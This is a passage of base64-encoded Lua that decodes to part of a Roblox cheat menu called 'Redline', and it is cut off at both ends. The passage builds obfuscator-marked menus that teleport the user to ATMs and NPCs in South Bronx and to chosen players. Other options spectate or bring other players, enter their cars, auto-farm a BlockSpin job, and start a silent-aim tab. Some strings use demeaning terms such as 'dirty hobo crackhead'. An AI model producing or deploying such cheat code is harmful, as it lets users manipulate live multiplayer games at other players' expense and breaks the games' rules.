ZnVsbHkgcHVyY2hhc2VkIHtzZWxmfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBGYWlsZWQgdG8gcHVyY2hhc2UgaXRlbSB7c2VsZn0gLiBlcnJvciA6IHtlcnJ9YCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSAxNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUHVyY2hhc2VHdW5Db2x1bW4gPSBQdXJjaGFzZUd1blRhYjpjb2x1bW4oe30pCgogICAgICAgICAgICAgICAgbG9jYWwgVGVsZXBvcnRMaXN0U2VjdGlvbiA9IFB1cmNoYXNlR3VuQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiVGVsZXBvcnQgVG8gTG9jYXRpb24iLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDEsIGljb24gPSBHZXRJbWFnZSgiV29ybGQucG5nIil9KQoKICAgICAgICAgICAgICAgIGxvY2FsIExvY2F0aW9uX05hbWVzID0geyJEaXJ0eSBIb2JvIPCfkqkiOyAiQWN0aXZlIEFUTSDwn4+nIn0KCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIENvbmZpZy5Tb3V0aF9Ccm9ueC5Mb2NhdGlvbnMgZG8KICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoTG9jYXRpb25fTmFtZXMsIEluZGV4KQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgdGFibGUuc29ydChMb2NhdGlvbl9OYW1lcywgZnVuY3Rpb24oLi4uKQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzZWxlY3QoMSwgLi4uKSA8IHNlbGVjdCgyLCAuLi4pCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgbG9jYWwgVFBfRGVib3VuY2UgPSBmYWxzZQoKICAgICAgICAgICAgICAgIFRlbGVwb3J0TGlzdFNlY3Rpb246bGlzdCh7ZmxhZyA9ICJUZWxlcG9ydFRvUGxhY2VfU291dGhCcm9ueCIsIG9wdGlvbnMgPSBMb2NhdGlvbl9OYW1lcywgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHN0YXRlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFRQX0RlYm91bmNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgUGxlYXNlIHdhaXQhYCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254LlNlbGVjdGVkX0xvY2F0aW9uID0gc3RhdGUKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIF9Qb3NpdGlvbiA9IENGcmFtZS5uZXcoMCwwLDApCgogICAgICAgICAgICAgICAgICAgICAgICBUUF9EZWJvdW5jZSA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN1YywgZXJyb3IgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguU2VsZWN0ZWRfTG9jYXRpb24gfj0gIkRpcnR5IEhvYm8g8J+SqSIgYW5kIENvbmZpZy5Tb3V0aF9Ccm9ueC5TZWxlY3RlZF9Mb2NhdGlvbiB+PSAiQWN0aXZlIEFUTSDwn4+nIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfUG9zaXRpb24gPSBDb25maWcuU291dGhfQnJvbnguTG9jYXRpb25zW0NvbmZpZy5Tb3V0aF9Ccm9ueC5TZWxlY3RlZF9Mb2NhdGlvbl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KENvbmZpZy5Tb3V0aF9Ccm9ueC5Mb2NhdGlvbnNbQ29uZmlnLlNvdXRoX0Jyb254LlNlbGVjdGVkX0xvY2F0aW9uXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBDb25maWcuU291dGhfQnJvbnguU2VsZWN0ZWRfTG9jYXRpb24gPT0gIkRpcnR5IEhvYm8g8J+SqSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFdvcmtzcGFjZS5Gb2xkZXJzLkhvbWVsZXNzUGVvcGxlOkZpbmRGaXJzdENoaWxkKCJSaWdodExvd2VyTGVnIiwgdHJ1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBfSG9ibyA9IFdvcmtzcGFjZS5Gb2xkZXJzLkhvbWVsZXNzUGVvcGxlOkZpbmRGaXJzdENoaWxkKCJSaWdodExvd2VyTGVnIiwgdHJ1ZSkuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9Qb3NpdGlvbiA9IF9Ib2JvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0KF9Ib2JvKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgRmFpbGVkIHRvIGxvY2F0ZSBkaXJ0eSBob2JvIGNyYWNraGVhZCFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgQ29uZmlnLlNvdXRoX0Jyb254LlNlbGVjdGVkX0xvY2F0aW9uID09ICJBY3RpdmUgQVRNIPCfj6ciIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBBVE1Qb3NpdGlvbnMgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTEgPSBDRnJhbWUubmV3KC0zMCwgNCwgLTMwMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTIgPSBDRnJhbWUubmV3KDUzOSwgNCwgLTM1Myk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTMgPSBDRnJhbWUubmV3KDQ5NywgNCwgNDAzKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNNCA9IENGcmFtZS5uZXcoMjM2LCA0LCAtMTU4KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNNSA9IENGcmFtZS5uZXcoNTI1LCAtOCwgLTkyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNNiA9IENGcmFtZS5uZXcoLTQ1MCwgNCwgMzcwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNNyA9IENGcmFtZS5uZXcoLTI2NiwgNCwgLTIwOSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTggPSBDRnJhbWUubmV3KC0xMSwgNCwgMjMxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNOSA9IENGcmFtZS5uZXcoNzE3LCA0LCA0MTApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBVE0xMCA9IENGcmFtZS5uZXcoLTUzMiwgMywgLTIxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNMTEgPSBDRnJhbWUubmV3KC02NDYsIDQsIDE1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTEyID0gQ0ZyYW1lLm5ldyg2OTgsIDMsIC0yNDEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBVE0xMyA9IENGcmFtZS5uZXcoLTMxNSwgNCwgMTQyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNMTQgPSBDRnJhbWUubmV3KC0zNzgsIDQsIC0zNjUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBVE0xNSA9IENGcmFtZS5uZXcoMzYwLCA0LCAtMzY0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNMTYgPSBDRnJhbWUubmV3KDg3MCwgMywgLTM0Nik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTE3ID0gQ0ZyYW1lLm5ldyg5MDQsIDMsIC05OSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTTE4ID0gQ0ZyYW1lLm5ldygxMDk1LCAzLCAxNzgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBVE0xOSA9IENGcmFtZS5uZXcoMTA1NCwgNCwgNTg1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNMjAgPSBDRnJhbWUubmV3KDg5NSwgNCwgMTQyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNMjEgPSBDRnJhbWUubmV3KDEwMjEsIDMsIC0yMjkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEFUTTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2UuTWFwLkFUTVM6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5BVE1TY3JlZW4uVHJhbnNwYXJlbmN5ID09IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRNID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfUG9zaXRpb24gPSBBVE1Qb3NpdGlvbnNbdG9zdHJpbmcoQVRNKV0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQVRNUG9zaXRpb25zW3Rvc3RyaW5nKEFUTSldKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIFRQX0RlYm91bmNlID0gZmFsc2UKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIF9Qb3NpdGlvbi5Qb3NpdGlvbikuTWFnbml0dWRlID4gMjAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBGYWlsZWQgdGVsZXBvcnRlZCB0byB7c3RhdGV9IWAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlmZXRpbWUgPSA3LjUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3VjIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgU3VjY2Vzc2Z1bGx5IHRlbGVwb3J0ZWQgdG8ge3N0YXRlfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBUZWxlcG9ydGF0aW9uIHRvIHtzdGF0ZX0uIGVycm9yIDoge2Vycn1gLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gMTUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkpCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGRvIC0tIFxcIFBsYXllciBUYWIgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgQ29sdW1uID0gUGxheWVyc1RhYjpjb2x1bW4oe30pCgogICAgICAgICAgICAgICAgbG9jYWwgUGxheWVyTGlzdFNlY3Rpb24gPSBDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJTZWxlY3QgUGxheWVyIiwgc2l6ZSA9IDEsIGRlZmF1bHQgPSBmYWxzZSwgc2lkZSA9ICdsZWZ0JyAtLVtbMyBwZW9wbGUgaWNvbl1dfSkKCiAgICAgICAgICAgICAgICBsb2NhbCBQbGF5ZXJMaXN0ID0gUGxheWVyTGlzdFNlY3Rpb246bGlzdCh7ZmxhZyA9ICJTZWxlY3RQbGF5ZXJfU291dGhCcm9ueCIsIG9wdGlvbnMgPSB7fSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyID0gdG9zdHJpbmcoc3RhdGUpCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFJlZnJlc2hQbGF5ZXJzID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIENhY2hlID0ge30KCiAgICAgICAgICAgICAgICAgICAgZm9yIGksIFBsYXllciBpbiBQbGF5ZXJzOkdldFBsYXllcnMoKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBQbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChDYWNoZSwgUGxheWVyLk5hbWUpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIHRhYmxlLnNvcnQoQ2FjaGUpCgogICAgICAgICAgICAgICAgICAgIFBsYXllckxpc3QucmVmcmVzaF9vcHRpb25zKENhY2hlKQogICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oUmVmcmVzaFBsYXllcnMpCgogICAgICAgICAgICAgICAgUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KFJlZnJlc2hQbGF5ZXJzKQoKICAgICAgICAgICAgICAgIFBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChSZWZyZXNoUGxheWVycykKCiAgICAgICAgICAgICAgICBDb2x1bW4gPSBQbGF5ZXJzVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBQbGF5ZXJPcHRpb25zU2VjdGlvbiA9IENvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlBsYXllciBPcHRpb25zIiwgc2l6ZSA9IDEsIGRlZmF1bHQgPSBmYWxzZSwgc2lkZSA9ICdyaWdodCcsIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBQbGF5ZXJPcHRpb25zU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJTcGVjdGF0ZSBQbGF5ZXIiLCBmbGFnID0gIlNwZWN0YXRlUGxheWVyX1NvdXRoQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TcGVjdGF0ZVBsYXllciA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIFBsYXllck9wdGlvbnNTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkJyaW5nIFBsYXllciIsIGZsYWcgPSAiQnJpbmdQbGF5ZXJfU291dGhCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLkJyaW5naW5nUGxheWVyID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIlRlbGVwb3J0IFRvIFBsYXllciIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllciB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFN1Y2Nlc3MsIEVycm9yID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoUGxheWVyc1tDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyXS5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIFBsYXllcnNbQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcl0uQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZSA+IDIwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8gPSBgRmFpbGVkIHRvIHRlbGVwb3J0IHRvIHtDb25maWcuU291dGhfQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyfSFgLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNy41CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFN1Y2Nlc3MgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBTdWNjZXNzZnVsbHkgdGVsZXBvcnRlZCB0byB7Q29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcn0hYCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWZldGltZSA9IDcuNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5mbyA9IGBGYWlsZWQgdG8gdGVsZXBvcnQgdG8ge0NvbmZpZy5Tb3V0aF9Ccm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXJ9LiBFcnJvciA6IHtFcnJvcn1gLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gMTAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFBsYXllck9wdGlvbnNTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJHZXQgSW50byBQbGF5ZXJzIENhciIsIGNhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKFNpdEluUGxheWVyc1ZlaGljbGUsIFBsYXllcnNbQ29uZmlnLlNvdXRoX0Jyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcl0pCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmlmIEdhbWVfTmFtZSA9PSAiQmxvY2tTcGluIiB0aGVuCiAgICB3aW5kb3c6c2VwZXJhdG9yKHtuYW1lID0gIiJ9KSBkbwogICAgICAgIGxvY2FsIExvY2FsUGxheWVyVGFiLCBQbGF5ZXJzVGFiLCBQdXJjaGFzZUd1blRhYiwgTWlzY1RhYiA9IHdpbmRvdzp0YWIoe25hbWUgPSAiTWFpbiIsIHRhYnMgPSB7IkxvY2FsIFBsYXllciJ9LCBpY29uID0gR2V0SW1hZ2UoIldvcmxkLnBuZyIpfSkgZG8KICAgICAgICAgICAgbG9jYWwgTG9jYWxQbGF5ZXJDb2x1bW4gPSBMb2NhbFBsYXllclRhYjpjb2x1bW4oe30pCiAgICAgICAgICAgIGxvY2FsIExvY2FsUGxheWVyTW9kc1NlY3Rpb24gPSBMb2NhbFBsYXllckNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkxvY2FsIFBsYXllciBNb2RpZmljYXRpb25zIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNDc1fSkKCiAgICAgICAgICAgIGxvY2FsIEZhcm1pbmdTZWN0aW9uID0gTG9jYWxQbGF5ZXJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJBdXRvLUZhcm1pbmcgVXRpbGl0aWVzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNDc1LCBpY29uID0gR2V0SW1hZ2UoIldoZWF0dC5wbmciKX0pCgogICAgICAgICAgICBsb2NhbCBfU2NyaXB0TG9hZGVkID0gZmFsc2UKCiAgICAgICAgICAgIEZhcm1pbmdTZWN0aW9uOmRyb3Bkb3duKHtuYW1lID0gIk1vcGUgVHlwZSIsIGZsYWcgPSAiTW9wVHlwZV9CbG9ja1NwaW4iLCB3aWR0aCA9IDEyMCwgaXRlbXMgPSB7IkRlZmF1bHQiLCAiU2lsdmVyIiwgIkdvbGQiLCAiRGlhbW9uZCJ9LCBzZXBlcmF0b3IgPSBmYWxzZSwgbXVsdGkgPSBmYWxzZSwgZGVmYXVsdCA9ICdEZWZhdWx0JywgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgIENvbmZpZy5CbG9ja1NwaW4uQXV0b0Zhcm1pbmcuTW9wVHlwZSA9IHN0YXRlCiAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICBGYXJtaW5nU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiQXV0by1GYXJtIE1vcCBKb2IiLCBmbGFnID0gIkphbml0b3JGYXJtX0Jsb2NrU3BpbiIsIHR5cGUgPSAidG9nZ2xlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgIGlmIG5vdCBfU2NyaXB0TG9hZGVkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgQ29uZmlnLkJsb2NrU3Bpbi5BdXRvRmFybWluZy5GYXJtTW9wcyA9IHN0YXRlCgogICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkJsb2NrU3Bpbi5BdXRvRmFybWluZy5GYXJtTW9wcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFN0YXJ0X01vcEZhcm0oKQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgU3RvcF9Nb3BGYXJtKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgIF9TY3JpcHRMb2FkZWQgPSB0cnVlCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLXdpbmRvdzpzZXBlcmF0b3Ioe25hbWUgPSAiIn0pIGRvCiAgICBsb2NhbCBTaWxlbnRBaW1UYWIgPSB3aW5kb3c6dGFiKHtuYW1lID0gIlNpbGVudCBBaW0iLCB0YWJzID0geyJHZW5lcmFsIFNldHRpbmdzIn0sIGljb24gPSBHZXRJbWFnZSgiUGlzdG9sLnBuZyIpfSkgZG8KICAgICAgICBsb2NhbCBTaWxlbnRBaW1Db2x1bW4gPSBTaWxlbnRBaW1UYWI6Y29sdW1uKHt9KQoKICAgICAgICBsb2NhbCBHZW5lcmFsU2VjdGlvbiA9IFNpbGVudEFpbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkdlbmVyYWwiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC4yMywgaWNvbiA9IEdldEltYWdlKCJVWkkucG5nIil9KQoKICAgICAgICBHZW5lcmFsU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJFbmFibGVkIiwgZmxhZyA9ICJTaWxlbnRBaW1fRW5hYmxlZCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLlNpbGVudC5FbmFibGVkID0gc